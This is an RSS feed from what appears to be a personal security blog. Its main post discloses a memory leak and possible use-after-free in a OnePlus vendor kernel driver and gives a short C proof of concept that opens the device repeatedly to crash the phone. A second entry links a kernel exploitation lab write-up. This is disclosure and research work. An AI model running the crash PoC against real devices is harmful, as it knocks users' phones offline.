<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>use-after-free on IamAlch3mist blogs</title>
    <link>https://IamAlch3mist.github.io/tags/use-after-free/</link>
    <description>Recent content in use-after-free on IamAlch3mist blogs</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 28 Sep 2025 03:07:44 +0530</lastBuildDate><atom:link href="https://IamAlch3mist.github.io/tags/use-after-free/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Oneplus kernel memory leak and potential use after free</title>
      <link>https://IamAlch3mist.github.io/posts/oneplus_kernel_uaf_memoryleak/</link>
      <pubDate>Sun, 28 Sep 2025 03:07:44 +0530</pubDate>
      
      <guid>https://IamAlch3mist.github.io/posts/oneplus_kernel_uaf_memoryleak/</guid>
      <description>I borrowed a OnePlus phone from a friend to experiment with the kernel. Since the kernel is open source, I started digging (hoping for an LPE). I found a couple more bugs they are for another blog post, but hereâ€™s a neat little memory leak that can be abused for DoS and can lead to useâ€‘afterâ€‘free.
I focused on vendor-specific drivers rather than the mainline kernel. The driver in question is: drivers/soc/oplus/midas/midas_dev.</description>
      <content>&lt;p&gt;I borrowed a OnePlus phone from a friend to experiment with the kernel. Since the kernel is open source, I started digging (hoping for an LPE). I found a couple more bugs they are for another blog post, but hereâ€™s a neat little memory leak that can be abused for DoS and can lead to useâ€‘afterâ€‘free.&lt;/p&gt;
&lt;p&gt;I focused on vendor-specific drivers rather than the &lt;a href=&#34;https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893&#34;&gt;mainline kernel&lt;/a&gt;. The driver in question is: &lt;a href=&#34;https://github.com/OnePlusOSS/android_kernel_oneplus_mt6893/blob/oneplus/MT6893_R_11.0/drivers/soc/oplus/midas/midas_dev.c&#34;&gt;&lt;code&gt;drivers/soc/oplus/midas/midas_dev.c&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The driver exports the usual file operations with callbacks to open, close, mmap, and ioctl.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file_operations midas_dev_fops &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
	.open &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; midas_dev_open,
	.release &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; midas_dev_release,
	.mmap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; midas_dev_mmap,
	.unlocked_ioctl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; midas_dev_ioctl,
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;On open the driver an allocation happens using kzalloc with the size of struct midas_priv_info and stored in the pointer info. At 2 the allocated info is stored in privat_data member of file struct which is basically a void pointer.&lt;/p&gt;
&lt;p&gt;On close the info pointer is retrieved from the file struct and passed to kfree.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;midas_dev_open&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; inode &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;inode, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filp)
{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; midas_priv_info &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;info &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kzalloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; midas_priv_info), GFP_KERNEL); &lt;span style=&#34;color:#75715e&#34;&gt;// [1]  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (IS_ERR_OR_NULL(info))
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;ENOMEM;

	info&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;mmap_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; vmalloc_user(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; midas_mmap_data));
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (IS_ERR_OR_NULL(info&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;mmap_addr)) {
		pr_err(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mmap_addr vmalloc failed!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
		ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;ENOMEM;
		&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; err_info_alloc;
	}

	filp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;private_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; info; &lt;span style=&#34;color:#75715e&#34;&gt;// [2]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

err_info_alloc:
	kfree(info);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret;
}


&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;midas_dev_release&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; inode &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;inode, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filp)
{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; midas_priv_info &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;info &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; filp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;private_data;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (IS_ERR_OR_NULL(info))
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (info&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;mmap_addr &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
		vfree(info&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;mmap_addr);

	kfree(info); &lt;span style=&#34;color:#75715e&#34;&gt;// use after free
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are no locks or checks on in the file-&amp;gt;private_data. If the driver is opened multiple times (without properly closing prior handles). The file-&amp;gt;private_data pointer can be overwritten with a newly allocated info. Which results in memory leak.&lt;/p&gt;
&lt;p&gt;On close the allocated memory is freed but file-&amp;gt;private data holds reference to the info pointer and didn&amp;rsquo;t set to NULL. Combined with the ability to open the driver multiple times leading to potential use-after-free.&lt;/p&gt;
&lt;p&gt;system user have permision to interact with the driver.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;OP515BL1:/data/local/tmp&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# ls -al /dev/midas_dev&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;crw-rw---- 1 system system 238,   0 2025-09-28 04:53 /dev/midas_dev&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Poc to crash the device using the memory leak.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// aarch64-linux-gnu-gcc -static poc.c 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {

    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffff&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/midas_dev&amp;#34;&lt;/span&gt;, O_RDWR);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;open failed&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
    }

}
    close(fd);

&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/kzA2Qn1aQik&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I expected good quality from oneplus it was disappointing to see such bugs. In the end I found couple more uaf.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>mobilehackinglab: android kernel writeup</title>
      <link>https://IamAlch3mist.github.io/posts/mhl_android_kernel_writeup/</link>
      <pubDate>Fri, 06 Jun 2025 05:00:35 +0530</pubDate>
      
      <guid>https://IamAlch3mist.github.io/posts/mhl_android_kernel_writeup/</guid>
      <description>Recently I solved the tryout labs an Android kernel exploitation challenge, the challenge involved exploiting an UAF bug in the android kernel driver to gain local privilege escalation.
you can find my writeup in the below link
https://hacklido.com/blog/1105-mobile-hacking-lab-android-kernel-writeup
Edit:
I also solved the AI Accelerator challenge (yet another android kernel exploitation challenge ðŸ˜„) and eventually the first one to solve the challenge. I&amp;rsquo;m in the process of creating an writeup for it.</description>
      <content>&lt;p&gt;Recently I solved the tryout labs an Android kernel exploitation challenge, the challenge involved exploiting an UAF bug in the android kernel driver to gain local privilege escalation.&lt;/p&gt;
&lt;p&gt;you can find my writeup in the below link&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hacklido.com/blog/1105-mobile-hacking-lab-android-kernel-writeup&#34;&gt;https://hacklido.com/blog/1105-mobile-hacking-lab-android-kernel-writeup&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Edit:&lt;/p&gt;
&lt;p&gt;I also solved the AI Accelerator challenge (yet another android kernel exploitation challenge ðŸ˜„) and eventually the first one to solve the challenge. I&amp;rsquo;m in the process of creating an writeup for it.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
